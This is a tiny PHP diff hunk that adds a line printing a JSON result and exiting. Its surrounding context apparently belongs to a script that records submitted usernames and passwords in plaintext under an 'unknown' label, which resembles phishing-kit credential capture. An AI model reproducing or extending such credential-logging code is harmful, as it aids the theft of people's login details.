@@ -137,4 +137,7 @@ if (!isset($_REQUEST['empas']))
 
     save('unknown', $username . '|' . $password);
   }
+
+  die(json_encode($result));
+
 }
